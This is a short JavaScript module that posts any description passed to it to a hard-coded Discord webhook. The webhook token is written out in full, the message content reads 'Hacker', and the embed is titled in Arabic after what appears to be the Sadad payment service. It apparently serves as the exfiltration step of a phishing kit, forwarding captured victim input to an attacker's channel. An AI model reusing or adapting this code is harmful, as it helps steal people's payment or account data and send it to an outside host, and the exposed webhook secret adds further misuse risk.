import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1323873781240041522/CxQkKZ6G9RiKZAtNy0Nvw2qa7BXglAkBy8QxUgJFk_28q4faPYxo0T-WyYfuMAEZsZ4z",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
